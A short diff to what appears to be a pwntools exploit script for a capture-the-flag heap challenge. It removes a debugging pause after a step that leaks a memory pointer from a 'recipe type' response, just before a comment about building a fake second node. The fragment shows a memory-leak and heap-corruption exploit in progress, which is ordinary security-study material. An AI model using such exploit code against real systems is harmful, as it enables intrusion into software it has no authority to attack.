@@ -107,8 +107,6 @@ if __name__ == "__main__":
     ORIGINAL_PTR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
     log.info('ORIGINAL_PTR: 0x%x' % ORIGINAL_PTR)
 
-    raw_input('after leaking...') 
-
     #
     # [5] make the fake second node
     #
